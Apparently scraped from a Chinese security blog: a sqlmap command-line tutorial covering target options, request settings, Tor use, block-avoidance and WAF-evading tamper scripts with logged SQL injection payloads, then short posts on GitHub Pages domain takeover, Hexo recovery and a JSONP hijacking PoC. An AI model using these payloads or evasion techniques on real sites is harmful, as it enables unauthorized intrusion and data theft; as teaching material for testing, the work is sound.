片刻后命令执行完毕，可以看到当前目录中多了一个名为“sqlmap”的目录，该目录中保存着Sqlmap的Python源码、配置文件和文档。由于Python是解释执行的语言，不用编译，所以至此最新版的Sqlmap已经安装完成。cd到“sqlmap”目录中，用命令“python sqlmap”启动Sqlmap，如下图所示：Sqlmap安装完成,当想要更新Sqlmap时，进入到“sqlmap”目录中执行命令“git pull”即可。 0x03 输出级别(Output verbosity)参数：-vSqlmap的输出信息按从简到繁共分为7个级别（和葫芦娃一样多），依次为0、1、2、3、4、5和6。使用参数“-v &lt;级别&gt;”来指定某个等级，如使用参数“-v 6”来指定输出级别为6。默认输出级别为1。各个输出级别的描述如下： 0：只显示Python的tracebacks信息、错误信息[ERROR]和关键信息[CRITICAL]； 1：同时显示普通信息[INFO]和警告信息[WARNING]； 2：同时显示调试信息[DEBUG]； 3：同时显示注入使用的攻击荷载； 4：同时显示HTTP请求； 5：同时显示HTTP响应头； 6：同时显示HTTP响应体。各个级别输出的信息详细到什么程度，还需要自己尝试下，亲眼见到，才会有明确的认识。 0x04 指定目标Sqlmap运行时必须指定至少一个目标，支持一次指定多个目标。有以下几种指定目标的方式： 1.直接连接数据库参数：-d使用参数“-d”直接连接数据库，该参数后跟一个表示数据库的字符串，该字符串有以下两种格式：(1).当数据库管理系统是MySQL、Oracle、Microsoft SQL Server或PostgreSQL等时格式为： 1DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME (2).当数据库管理系统是SQLite、Microsoft Access或Firebird等时格式为： 1DBMS://DATABASE_FILEPATH 我用如下命令连接装在本机上的Mysql： 1python sqlmap.py -d \"mysql://root:root@127.0.0.1:3306/DISSchool\" 却出现了错误，错误为： 1[CRITICAL] sqlmap requires 'python-pymysql' third-party library in order to directly connect to the DBMS 'MySQL'. You can download it from 'https://github.com/petehunt/PyMySQL/'. Alternative is to use a package 'python-sqlalchemy' with support for dialect 'mysql' installed 意思是我没有安装Python连接Mysql用的第三方库python-pymysql。虽然我安装了python-mysqldb可以使Python连接Mysql，但显然Sqlmap使用的是python-pymysql而不是python-mysqldb。使用如下命令安装python-pymysql： 123git clone https://github.com/petehunt/PyMySQL/cd PyMySQL/sudo python setup.py install 安装好python-pymysql后再执行命令： 1python sqlmap.py -d \"mysql://root:root@127.0.0.1:3306/DISSchool\" 这次没有报错，成功的连接到了数据库。只是除了检测数据库确实是Mysql版本号大于等于5.0.0之外便什么都没有做。让Sqlmap做点什么需要用其他参数指定，这些参数我们稍晚些再学习。 2.指定目标URL参数：-u 或 –url使用参数“-u”或“–url”指定一个URL作为目标，该参数后跟一个表示URL的字符串，可以是http协议也可以是https协议，还可以指定端口，如： 1python sqlmap.py -u \"http://192.168.56.102:8080/user.php?id=0\" 3.从Burp或WebScarab的代理日志中解析目标参数：-l使用参数“-l”指定一个Burp或WebScarab的代理日志文件，Sqlmap将从日志文件中解析出可能的攻击目标，并逐个尝试进行注入。该参数后跟一个表示日志文件的路径。WebScarab我没有用过，Burp倒是常常会用。Burp默认不记录日志，想要记录日志需要手动开启，设置方法如下图所示：![设置Burp日志]只用勾选代理中的请求数据就足够了，日志文件路径可随意设置，这里我设置日志文件名为proxy.log，放在用户主目录中。设置浏览器的代理为Burp，随便浏览几个网页后发现proxy.log竟然已经有70多K大，查看其内容，部分输出如下： werner@Yasser:~$ more proxy.log ====================================================== 7:22:52 PM http://ocsp.digicert.com:80 [117.18.237.29] ====================================================== POST / HTTP/1.1 Host: ocsp.digicert.com User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-SG,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate Content-Length: 83 Content-Type: application/ocsp-request DNT: 1 Connection: close 0Q0O0M0K0I0 + �ǝ��Pr�Tz� ====================================================== ====================================================== 7:23:00 PM http://blog.csdn.net:80 [47.95.49.160] ====================================================== GET /pyufftj/article/details/21469201 HTTP/1.1 Host: blog.csdn.net User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 ...可以看到该日志文件不仅记录了GET参数，还记录了cookie和POST参数。现在使用如下命令让Sqlmap解析该日志文件，自动寻找目标，检测注入漏洞： 1python sqlmap.py -l ../proxy.log 注意日志文件的路径要写正确。执行该命令时，每找到一个可能的攻击目标，Sqlmap都会询问是否要检测该目标。，默认回答为“Y”，想要测试该目标，直接按回车键就行。当日志较大时会有很多可能目标，虽然有询问机制但依旧麻烦，因为不能一路按回车而要进行判断。若是可以对日志进行过滤就好了！确实是可以的，参数为“–scope”，详情见“五.18”。 4.从站点地图文件中解析目标参数：-x为便于搜索引擎收录，许多网站专门为搜索引擎生成了xml格式的站点地图，如百度Sitemap支持xml格式。Sqlmap可以直接解析xml格式的站点地图，从中提取攻击目标，对一个网站全方位无死角地进行注入检测，此时使用的参数是“-x”，如： 1python sqlmap.py -x http://www.6eat.com/sitemap.xml 但执行该命令的结果却是： 1[WARNING] no usable links found (with GET parameters) 没有找到有GET参数的可用链接。就我有限的经验而言，站点地图中的URL很少包含GET参数，POST参数就更不用说了。所以Sqlmap的这一功能似乎有些鸡肋。 5.从文本文件中解析目标参数：-m参数“-u”一次只能指定一个URL，若有多个URL需要测试就显得很不方便，我们可用将多个URL以一行一个的格式保存在文本文件中，然后使用参数“-m”，后跟该文本文件路径，让Sqlmap依次读取文件中的URL作为攻击目标。 如我们有文件url.txt，内容为： www.target1.com/vuln1.php?q=foobar www.target2.com/vuln2.asp?id=1 www.target3.com/vuln3/id/1*然后可用使用如下命令让Sqlmap测试这些URL是否存在注入漏洞： 1python sqlmap.py -m url.txt 同样,执行该命令时，Sqlmap会很贴心地一个个询问：“do you want to test this URL?” 6.从文件载入HTTP请求参数：-r可以将一个HTTP请求保存在文件中，然后使用参数“-r”加载该文件，Sqlmap会解析该文件，从该文件分析目标并进行测试。设有如下所示的HTTP请求保存在文件get.txt中： 123456789GET /user.php?id=1 HTTP/1.1Host: 192.168.56.101:8080User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-SG,en-US;q=0.7,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Connection: closeUpgrade-Insecure-Requests: 1 则使用如下命令让Sqlmap解析该文件，以该文件中HTTP请求目标为攻击目标进行测试： 1python sqlmap.py -r get.txt 7.将Google搜索结果作为攻击目标参数：-gSqlmap能自动获取Google搜索的前一百个结果，对其中有GET参数的URL进行注入测试。当然，所处的网络环境要能访问Google才行。下面是Sqlmap手册中“-g”参数的例子： 1python sqlmap.py -g \"inurl:\\\".php?id=1\\\"\" 8.从配置文件中载入攻击目标参数：-c使用参数“-c”指定一个配置文件（如：sqlmap.conf），Sqlmap会解析该配置文件，按照该配置文件的配置执行动作。配置文件中可以指定攻击目标，实际上除了攻击目标外，配置文件还可以指定各种参数的值。 Sqlmap的按照目录中有一个名为sqlmap.conf的文件，该文件是配置文件的模板，看看该文件内容，就能明白配置文件是什么意思了。 0x05 请求HTTP是一个复杂的协议。HTTP请求有很多种方法（method），可以在不同位置（GET、POST、cookie和User-Agent等）携带不同参数。往往只有在特定位置携带了特定参数以特定方法发起的请求才是合法有效的请求。Sqlmap运行时除了需要指定目标，有时还需要指定HTTP请求的一些细节。下面这些参数都用于指定HTTP请求细节。 1.HTTP方法参数：–method一般来说，Sqlmap能自动判断出是使用GET方法还是POST方法，但在某些情况下需要的可能是PUT等很少见的方法，此时就需要用参数“–method”来指定方法。如：“–method=PUT”。 2.POST数据参数：–data该参数指定的数据会被作为POST数据提交，Sqlmap也会检测该参数指定数据是否存在注入漏洞。如： 1python sqlmap.py -u \"http://192.168.56.102:8080/user.php\" --data=\"id=0&amp;name=werner\" 3.指定分隔符参数：–param-del上一个例子中“–data”的数据“id=0&amp;name=werner”其实由两个部分组成：“id=0”和“name=werner”，默认地以“&amp;”作为分隔符。我们可以使用“–param-del”来指定分隔符，如： 1python sqlmap.py -u \"http://192.168.56.102:8080/user.php\" --data=\"id=0;name=werner\" --param-del=\";\" 4.cookie参数：–cookie、–cookie-del、–drop-set-cookie和–load-cookies有两种情况会用到这些参数： 要测试的页面只有在登录状态下才能访问，登录状态用cookie识别 想要检测是否存在cookie注入当“–level”设置为2或更高时，Sqlmap会检测cookie是否存在注入漏洞，关于“–level”的更多信息见下文。 (1).“–cookie”和“–cookie-del”在浏览器中登录目标网站后复制出维持登录状态的cookie，用参数“–cookie”来指定这些cookie，如： 1python sqlmap.py -u \"http://192.168.56.102:8080/user.php\" --cookie \"JSESSIONID=E5D6C8C81;NAME=werner;\" 与POST参数不同，cookie默认的分隔符为“;”，想要指定cookie中的分隔符，使用参数“–cookie-del”。 (2).“–drop-set-cookie”若HTTP响应头中有“Set-Cookie”，Sqlmap会自动设置“Set-Cookie”设置的cookie，并对这些cookie进行检测。若不想让Sqlmap这么做，添加参数“–drop-set-cookie”即可，这样，Sqlmap会忽略“Set-Cookie”。 (3).“–load-cookies”该参数用于从文件中载入Netscape或wget格式的cookie。 12345678910wget可以保存和载入cookie，示例如下： # Log in to the server. This can be done only once. wget --save-cookies cookies.txt \\ --post-data &apos;user=foo&amp;password=bar&apos; \\ http://server.com/auth.php # Now grab the page or pages we care about. wget --load-cookies cookies.txt \\ -p http://server.com/interesting/article.php 5.User-Agent参数：–user-agent和–random-agent默认情况下Sqlmap发送的HTTP请求中的User-Agent值为： 1sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org) 使用参数“–user-agent”可以指定一个User-Agent值。但正常的User-Agent值长什么样我们可能并不记得，所以有了参数“–random-agent”，使用该参数，Sqlmap会从文件./txt/user-agents.txt中随机地取一个User-Agent。注意，在一次会话中只有使用同一个User-Agent，并不是每发一个HTTP请求包，都随机一个User-Agent。 用如下命令统计user-agents.txt行数： 1cat sqlmap/txt/user-agents.txt | wc -l 结果为4211，当然其中还包含空行、注释等，但总的来说该文件中存储的User-Agent也有4千多个。 当“–level”设置为3或更高时，Sqlmap会检测User-Agent是否存在注入漏洞，关于“–level”的更多信息见下文。 6.Host参数：–host使用该参数可以手动指定HTTP头中的Host值。 当“–level”设置为5或更高时，Sqlmap会检测Host是否存在注入漏洞，关于“–level”的更多信息见下文。 7.Referer参数：–referer使用该参数可以指定HTTP头中的Referer值。Sqlmap发送的HTTP请求头部默认无Referer字段。 当“–level”设置为3或更高时，Sqlmap会检测Referer是否存在注入漏洞，关于“–level”的更多信息见下文。 8.额外的HTTP头参数：–headers使用该参数可以在Sqlmap发送的HTTP请求报文头部添加字段，若添加多个字段，用“\\n”分隔。如命令： 1python sqlmap.py -u \"http://192.168.56.101:8080/\" -v 5 --headers \"X-A:A\\nX-B: B\" 发送的HTTP请求包为： 12345678GET / HTTP/1.1X-B: BHost: 192.168.56.101:8080Accept-encoding: gzip,deflateX-A: AAccept: */*User-agent: sqlmap/1.1.10#stable (http://sqlmap.org)Connection: close 加参数“-v 5”是为了让Sqlamp输出发送的HTTP请求包，便于我们观察。 9.身份认证参数：–auth-type和–auth-cred这些参数用于进行身份认证。“–auth-type”用于指定认证方式，支持以下三种身份认证方式： Basic Digest NTLM“–auth-cred”用于给出身份认证的凭证，格式是“username:password”。 如： 1python sqlmap.py -u \"http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1\" --auth-type Basic --auth-cred \"testuser:testpass\" 10.基于证书的身份认证参数：–auth-file若Web服务器要求客户端提供证书则可以使用此参数指定一个PEM格式的证书文件。我们知道SSL协议的客户端认证是可选的，实践中一般都只用服务器端提供自己的证书供客户端验证，很少要求客户端提供自己的证书。 11.忽略401参数：–ignore-401使用该参数忽略401错误（未认证）。 12.HTTP(S)代理参数：–proxy、–proxy-cred、–proxy-file和–ignore-proxy使用参数“–proxy”来设置一个HTTP(S)代理，格式是“http(s)://url:port”。若代理需要认证，使用参数“–proxy-cred”来提供认证凭证，格式是“username:password”。 使用参数“–proxy-file”指定一个存储着代理列表的文件，Sqlmap会依次使用文件中的代理，当某个代理有任何连接问题时就会被弃用而换下一个代理。 使用参数“–ignore-proxy”忽略本地代理设置。 13.Tor匿名网络参数：–tor、–tor-type、–tor-port和–check-tor不管出于什么原因，如果想要保持匿名状态与其使用单个的HTTP(S)代理，不如安装类似Privoxy这样的软件按照Tor的安装指导配置一个Tor客户端。设置好后使用参数“–tor”让Sqlmap自动设置使用Tor代理。 如果想要手动指定Tor的类型和端口可以使用参数“–tor-type”和“–tor-port”，如： 1--tor-type=SOCKS5 --tor-port 9050 如果要求高度的匿名性可以使用参数“–check-tor”，加上该参数后Sqlmap会确保所有流量都走Tor代理，若Tor代理失效，Sqlmap会发出警告并退出。检测方法是访问Are you using Tor? 14.HTTP请求之间添加延迟参数：–delay过于频繁地发送请求可能会被网站察觉或有其他不良后果。使用参数“–delay”来指定HTTP请求之间的延迟，单位为秒，类型是浮点数，如“–delay 1.5”表示延迟1.5秒。默认是没有延迟的。 15.超时参数：–timeout超时时间默认为30秒，可以用参数“–timeout”指定超时时间，如“–timeout 44.5”表示设置超时时间为44.5秒。 16.超时后最大重试次数参数：–retries超时后Sqlmap会进行重试，最大重试次数默认为3，可以用参数“–retries”指定最大重试次数。 17.随机化参数值参数：–randomize使用该参数，Sqlmap会随机生成每次HTTP请求中参数的值，值的类型和长度依照于原始值。 18.用正则表达式过滤代理日志参数：–scope指定一个Python正则表达式对代理日志进行过滤，只测试符合正则表达式的目标，如： 1python sqlmap.py -l burp.log --scope=\"(www)?\\.target\\.(com|net|org)\" 19.避免错误请求过多而被屏蔽参数：–safe-url、–safe-post、–safe-req和–safe-freq有时服务器检测到某个客户端错误请求过多会对其进行屏蔽，而Sqlmap的测试往往会产生大量错误请求，为避免被屏蔽，可以时不时的产生几个正常请求以迷惑服务器。有以下四个参数与这一机制有关： 1234–safe-url: 隔一会就访问一下的安全URL–safe-post: 访问安全URL时携带的POST数据–safe-req: 从文件中载入安全HTTP请求–safe-freq: 每次测试请求之后都会访问一下的安全URL 这里所谓的安全URL是指访问会返回200、没有任何报错的URL。相应地，Sqlmap也不会对安全URL进行任何注入测试。 20.关闭URL编码参数：–skip-urlencodeSqlmap默认会对URL进行URL编码，可以使用该参数关闭URL编码。 21.绕过CSRF保护参数：–csrf-token和–csrf-url现在有很多网站通过在表单中添加值为随机生成的token的隐藏字段来防止CSRF攻击，Sqlmap会自动识别出这种保护方式并绕过。但自动识别有可能失效，此时就要用到这两个参数。 “–csrf-token”用于指定包含token的隐藏字段名，若这个字段名不是常见的防止CSRF攻击的字段名Sqlmap可能不能自动识别出，需要手动指定。如Django中该字段名为“csrfmiddlewaretoken”，明显与CSRF攻击有关。 “–csrf-url”用于从任意的URL中回收token值。若最初有漏洞的目标URL中没有包含token值而又要求在其他地址提取token值时该参数就很有用。 22.强制使用SSL参数：–force-ssl 23.在每次请求前执行特定Python代码参数：–eval直接看例子： 1python sqlmap.py -u \"http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b\" --eval=\"import hashlib;hash=hashlib.md5(id).hexdigest()\" 每次返送请求前，Sqlmap都会依据id值重新计算hash值并更新GET请求中的hash值。 0x06 优化这些参数可以优化Sqlmap的性能。1.一键优化参数：-o添加此参数相当于同时添加下列三个优化参数： 123–keep-alive–null-connection–threads=3 （如果没有设置一个更好的值） 这些参数具体含义见后文。 2.HTTP长连接参数：–keep-alive该参数让Sqlmap使用HTTP长连接。该参数与“–proxy”矛盾。 3.HTTP空连接参数：–null-connection有一种特殊的HTTP请求类型可以直接获得HTTP响应的大小而不用获得HTTP响应体。显然这在布尔型盲注中可以节约很大的带宽。当然这一技术是需要服务器端支持的。该参数与“–text-only”矛盾。4.HTTP并发参数：–threads使用该参数指定Sqlmap可以达到的最大并发数。从性能和网站承受能力两方面考虑最大并发数不要超过10。 0x07 注入这些参数被用于指定要测试的参数、定制攻击荷载和选择篡改脚本。1.要测试的注入点参数：-p和–skip默认情况下Sqlmap会测试所有GET参数和POST参数，当level大于等于2时会测试cookie参数，当level大于等于3时会测试User-Agent和Referer。实际上还可以手动指定一个以逗号分隔的、要测试的参数列表，该列表中的参数不受level限制。这就是“-p”的作用。 举个例子，若想只测试GET参数“id”和User-Agent，则可以这么写： 1-p &quot;id,user-agent&quot; 如果不想测试某一参数则可以使用“–skip”。如设置了level为5但不想测试User-Agent和Referer，则可以这么写： 1--level=5 --skip=&quot;user-agent,referer&quot; 有时会遇到伪静态网页。动态网页会明目张胆地列出参数，如： 1/user.php?id=1 显然参数是id，值为1。但若是伪静态网页则可能这样写： 1/user/1/ 将参数隐藏在URL中。通常情况下Sqlmap不会对这样的伪静态网页的参数做测试，因为Sqlmap无法判断哪个是参数。若想要对这样的伪静态进行测试，只需要加上“*”，告诉Sqlmap哪个是伪静态参数就行，剩下事的和GET参数没有什么区别。如： 1python sqlmap.py -u \"http(s)://target.cc/user/1*/\" 2.指定数据库管理系统参数：–dbmsdbms是“Database Management System”的缩写。默认情况下Sqlmap会自动检测网站使用的数据库管理系统，Sqlmap支持以下这些数据库管理系统： MySQL Oracle PostgreSQL Microsoft SQL Server Microsoft Access Firebird SQLite Sybase SAP MaxDB DB2如果Sqlmap自动检测失败或是不想让Sqlmap进行数据库指纹检测，可以使用参数“–dbms”手动指定数据库管理系统，如：“–dbms postgresql”。 对于Mysql和Microsoft SQL Server和要这样指定： 12--dbms MySQL &lt;version&gt;--dbms Microsoft SQL Server &lt;version&gt; 对于MySQL来说，是类似这样的：5.0。对于Microsoft SQL Server来说，是类似这样的：2005。 如果在添加“–dbms”参数的同时还添加了“–fingerprint”，Sqlmap只会在指定的数据库管理系统内进行指纹识别。只有在很确定时使用“–dbms”，否则还是让Sqlmap自动检测更好些。 3.指定运行数据库管理系统的操作系统参数：–os默认情况下Sqlmap会自动检测运行数据库管理系统的操作系统，目前完全支持的操作系统有： Linux Windows如果很确定可以使用参数“–os”指定运行数据库管理系统的操作系统。当然在只用很确定时才应该使用此参数，否则还是让Sqlmap自动检测更好些。 4.生成无效参数值时强制使用大数参数：–invalid-bignum有时在注入测试时需要生成无效参数，一般情况下Sqlmap会取已有参数（如：id=13）的相反数（如：id=-13）作为无效参数。但若添加“–invalid-bignum”，Sqlmap就会取大数（如：id=99999999）作为无效参数。 5.生成无效参数值时强制使用逻辑操作符参数：–invalid-logical有时在注入测试时需要生成无效参数，一般情况下Sqlmap会取已有参数（如：id=13）的相反数（如：id=-13）作为无效参数。但若添加“–invalid-logical”，Sqlmap就会使用逻辑操作符（如：id=13 AND 18=19）作为无效参数。 6.生成无效参数值时强制使用字符串参数：–invalid-string有时在注入测试时需要生成无效参数，一般情况下Sqlmap会取已有参数（如：id=13）的相反数（如：id=-13）作为无效参数。但若添加“–invalid-logical”，Sqlmap就会使用字符串（如：id=akewmc）作为无效参数。 7.关闭payload转换参数：–no-cast在检索结果时Sqlmap会将所有输入转换为字符串类型，若遇到空值（NULL）则将其替换为空白字符。这样做是为了防止如连接空值和字符串之类的任何错误发生并可以简化数据检索过程。但是有报告显示在老版本的Mysql中这样做会导致数据检索出现问题，因此添加了“–no-cast”来告诉Sqlmap不要这样做。 8.关闭字符串编码参数：–no-escape有时Sqlmap会使用用单引号括起来的字符串值作为payload，如“SELECT ‘foobar’”，默认地这些值会被编码，如上例将被编码为：“SELECT CHAR(102)+CHAR(111)+CHAR(111)+CHAR(98)+CHAR(97)+CHAR(114))”。这样做既可以混淆视听让人一时难以洞察payload的内容又可以在后台服务器使用类似magic_quote或mysql_real_escape_string这样的转义函数的情况下字符串不受影响。当然在某些情况下需要关闭字符串编码，如为了缩减payload长度，用户可以使用“–no-escape”来关闭字符串编码。 9.定制payload参数：–prefix和–suffix有时只有在payload后添加用户指定的后缀才能注入成功。另一种场景是用户已经知道查询语句怎么写的，此时可以直接指定payload的前缀和后缀来完成检测和注入。 一个有漏洞的源码示例如下： 1query = \"SELECT * FROM users WHERE id=('\" . $\\_GET['id'] . \"') LIMIT 0, 1\"; 对这样的例子可以让Sqlmap自动检测边界范围也可以手动指出边界范围： 1python sqlmap.py -u \"http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1\" -p id --prefix \"')\" --suffix \"AND ('abc'='abc\" 最终SQL语句会变成： 1SELECT * FROM users WHERE id=('1') &lt;PAYLOAD&gt; AND ('abc'='abc') LIMIT 0, 1 这个句子语法是正确的，payloa也能执行。 在简单的测试环境下Sqlmap不需要被提供定制的边界范围就能够自动检测并完成注入，但在真实世界中某些应用可能会很复杂如嵌套JOIN查询，此时就需要为Sqlmap指明边界范围。 10.修改注入数据参数：–tamper除了用CHAR()编码字符串外Sqlmap没有对payload进行任何混淆。该参数用于对payload进行混淆以绕过IPS或WAF。该参数后跟一个tamper脚本的名字。若该tamper脚本位于sqlmap的安装目录的tamper/目录中，就可以省略路径和后缀名，只写文件名。多个tamper脚本之间用空格隔开。 在tamper/目录中有许多可用的tamper脚本。tamper脚本的作用是对payload进行混淆。我们还可以自己写tamper脚本，这属于Sqlmap的高级用法，一个有效的tamper脚本如下所示： # 必须要导入的库 from lib.core.enums import PRIORITY # 定义该tamper脚本的优先级 __priority__ = PRIORITY.NORMAL def tamper(payload): &apos;&apos;&apos;此处是tamper的说明&apos;&apos;&apos; retVal = payload # 此处是用于修改payload的代码 # 返回修改后的payload return retVal下面是一个示例，该示例的目标是Mysql，假定大于号、空格和开头的SELECT是被禁止的： 12python sqlmap.py -u \"http://192.168.56.101:8080/ScorePrj/?id=1\" \\--tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 该示例部分输出如下： 12345678910111213141516171819202122232425[12:55:52] [DEBUG] cleaning up configuration parameters[12:55:52] [INFO] loading tamper script 'between'[12:55:52] [INFO] loading tamper script 'randomcase'[12:55:52] [INFO] loading tamper script 'space2comment'[...][12:55:53] [INFO] testing for SQL injection on GET parameter 'id'[12:55:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[12:55:53] [PAYLOAD] 1[12:55:53] [PAYLOAD] 1)/**/aNd/**/8083=4737/**/aNd/**/(4754/**/BetwEen/**/4754/**/aNd/**/4754[12:55:53] [PAYLOAD] 1)/**/anD/**/4962=4962/**/anD/**/(2361/**/BeTweEN/**/2361/**/anD/**/2361[12:55:53] [PAYLOAD] 1/**/aNd/**/9754/**/BETwEEn/**/1206/**/aNd/**/1206[12:55:53] [PAYLOAD] 1/**/AnD/**/4962/**/beTweEn/**/4962/**/AnD/**/4962[12:55:53] [PAYLOAD] 1/**/aND/**/2741/**/BetWeEn/**/9323/**/aND/**/9323--/**/Ihsa[12:55:53] [PAYLOAD] 1/**/anD/**/4962/**/BetweEN/**/4962/**/anD/**/4962--/**/wVUI[12:55:53] [PAYLOAD] 1')/**/anD/**/1694=6061/**/anD/**/('zLwu'='zLwu[12:55:53] [PAYLOAD] 1')/**/ANd/**/4962=4962/**/ANd/**/('Dsfw'='Dsfw[12:55:53] [PAYLOAD] 1'/**/aND/**/6307=8901/**/aND/**/'fKLn'='fKLn[12:55:53] [PAYLOAD] 1'/**/aNd/**/4962=4962/**/aNd/**/'YFsp'='YFsp[12:55:53] [PAYLOAD] 1%'/**/anD/**/3549=6854/**/anD/**/'%'='[12:55:53] [PAYLOAD] 1%'/**/aND/**/4962=4962/**/aND/**/'%'='[...][12:55:54] [PAYLOAD] 1)/**/uNIoN/**/alL/**/Select/**/nuLl--/**/NRtq[12:55:54] [PAYLOAD] 1)/**/UnIOn/**/alL/**/sElEcT/**/nuLL,nuLL--/**/jalk[12:55:54] [PAYLOAD] 1)/**/Union/**/aLl/**/seLeCt/**/nuLL,nuLL,nuLL--/**/ylpg[...] 而若不加tamper脚本，上例的部分输出为： 1234567891011121314151617181920[...] [13:00:12] [INFO] testing for SQL injection on GET parameter 'id' [13:00:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause' [13:00:12] [PAYLOAD] 1) AND 9902=5632 AND (5820=5820 [13:00:12] [PAYLOAD] 1) AND 6711=6711 AND (7174=7174 [13:00:12] [PAYLOAD] 1 AND 7140=6136 [13:00:12] [PAYLOAD] 1 AND 6711=6711 [13:00:12] [PAYLOAD] 1 AND 1693=7532-- oqcR [13:00:12] [PAYLOAD] 1 AND 6711=6711-- qAPJ [13:00:12] [PAYLOAD] 1') AND 6904=7395 AND ('xBlu'='xBlu [13:00:12] [PAYLOAD] 1') AND 6711=6711 AND ('RgoX'='RgoX [13:00:12] [PAYLOAD] 1' AND 6469=7302 AND 'maCj'='maCj [13:00:12] [PAYLOAD] 1' AND 6711=6711 AND 'pSYg'='pSYg [13:00:12] [PAYLOAD] 1%' AND 7516=3605 AND '%'=' [13:00:12] [PAYLOAD] 1%' AND 6711=6711 AND '%'=' [...] [13:00:12] [PAYLOAD] 1) UNION ALL SELECT NULL-- mUDh [13:00:12] [PAYLOAD] 1) UNION ALL SELECT NULL,NULL-- QKId [13:00:12] [PAYLOAD] 1) UNION ALL SELECT NULL,NULL,NULL-- iwvT [...] 0x08 总结后面命令行还有很多，多了我是有点看不下去的，所以分成三部分吧。","link":"/2019/03/22/Sqlmap%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%88%E5%85%B6%E4%B8%80%EF%BC%89/"},{"title":"github下的域名劫持","text":"眼见时光流逝，我心里十分恼火，必须做出选择，我也总觉得无法忍受。在我看来，选择，与其说是取舍，不如说是摈弃我没有选的东西。我惶恐的发现时间的狭隘性，发现时间仅有一维，不是我所希望的宽阔跑道，而是一条线，我的各种欲望跑在上面，势必相互践踏。 ——安德烈·纪德《人间食粮》 0x00 前言之前我用GitHub搭建自己博客的时候，老表哥给我提到一个关于github的域名劫持漏洞，当时不是很懂，后来自己悄悄搞了一下，这里记录一下大概过程。 0x01 github域名绑定获取自己的域名 www.test.com 后，需要到域名对应的控制台配置解析，设置@(直接解析主域名test.com)主机记录，记录类型为CNAME，主机记录就是域名的前缀。常见的主机记录有： www： 解析后的域名为 www.test.com。 @： 直接解析主域名 test.com。 * ： 泛解析，匹配其他所有域名 *.test.com。 mail： 将域名解析为 mail.test.com，通常用于解析邮箱服务器。 二级域名： aaa.test.com，填写abc。 手机网站： bbb.test.com，填写m 正常的域名绑定到GitHub上的项目网站，首先需要在项目public目录下添加一个名为CNAME的文件(无后缀名)，该文件的内容是 www.test.com 域名,然后将该文件发布到GitHub上，就能通过 www.test.com 访问 test.github.io(GitHub仓库) 了。A记录是把一个域名解析到一个IP地址（Address，特制数字IP地址），而CNAME记录是把域名解析到另外一个域名，也就是将 test.github.io 映射到 www.test.com 。 0x02 github域名劫持原理就是 www.test.com 的域名还没绑定之前。或者域名没失效之前我们配置的CNAME被GitHub 404,如被删除。攻击者将CNAME配置到他们的GitHub项目里，然后 www.test.com 就被解析到了攻击者的GitHub页面或者其他钓鱼页面。","link":"/2019/01/31/github%E4%B8%8B%E7%9A%84%E5%9F%9F%E5%90%8D%E5%8A%AB%E6%8C%81/"},{"title":"hexo博客的恢复","text":"1111 最最重要的就是：定时备份博客本地文件夹！定时备份博客本地文件夹！定时备份博客本地文件夹！1. 重命名网站目录比如hexo 改为hexo1 2. 重新安装hexonpm install hexo -g新建hexo 目录进入hexo目录初始化Hexohexo init # 初始化必须在空文件夹中 3. 复制替换文件将hexo1目录下的_config.yml 文件，source、themes、public目录复制到hexo目录下，覆盖替换原文件和目录（一般这些文件不是导致出错的原因）,安装push工具 npm install hexo-deployer-git –save 4. 重新部署完成之后运行如下命令：hexo clean &amp;&amp; hexo g &amp;&amp; hexo d或者hexo g -d 参考链接：https://www.jianshu.com/p/034591801cca","link":"/2019/11/19/hexo%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%81%A2%E5%A4%8D/"},{"title":"Json劫持","text":"我知道在有生之年无法找到任何理由替自己辩解，因为我便是我自己的障碍。 ——维斯拉瓦·辛波斯卡《万物静默如谜》 0x00 json简介ajax以自定义字符串、XML、json等格式来交换数据。跨域的需求如何解决？服务器端代理（nginx）、jsonp、允许跨域的响应头(即跨域资源共享cors)。 json是一种数据交换格式。 jsonp是一个非官方的数据交换协议，利用script元素的开放策略，用来实现跨域访问，因为网页可以得到其他源动态产生的json数据。该协议的一个要点就是允许用户传递一个callback参数给服务端，然后服务端返回数据时会将这个callback参数作为函数名来包裹住JSON数据，这样客户端就可以随意定制自己的函数来自动处理返回数据了 0x01 json劫持“json hijacking”攻击过程和csrf类似，csrf发送的是HTTP请求，json hijackjing的目的是获取敏感数据。一些web应用会把一些敏感数据以json的形式返回到前端，如果仅以cookie来判断请求的合法性，那么就可以利用类似csrf的手段，向目标服务器发送请求，获取敏感数据。 现有页面http://www.f4guo.com/userinfo ，该页面在用户登录的情况下会返回json格式的用户信息。攻击者在其虚假的页面中加入如下标签： 1&lt;script src=&quot;http://www.test.com/userinfo&quot;&gt;&lt;/script&gt; 正常用户如果在浏览器中登录了 www.f4guo.com ，且cookie没有过期，然后访问了攻击者的虚假页面，那么攻击者就能获取到json形式的敏感数据。因为script标签会自动解析json数据，生成对应的js对象，然后通过 Object.prototype._defineSetter 这个函数来触发恶意代码。目前这个函数在当前最新版本chrome和firefox浏览器中已经失效了。 0x02 json漏洞挖掘burpsuite中HTTP history搜寻返回有json形式的敏感数据,然后复制url到poc中进行验证。验证poc： 1234567&lt;script&gt; function jsonp1(json){ alert(JSON.stringify(json)) } &lt;/script&gt;&lt;script src=\"https://xxx.xom/xxx?callback=jsonp1\"&gt;&lt;/script&gt; 保存为.html然后部署到自己的服务器进行解析执行。 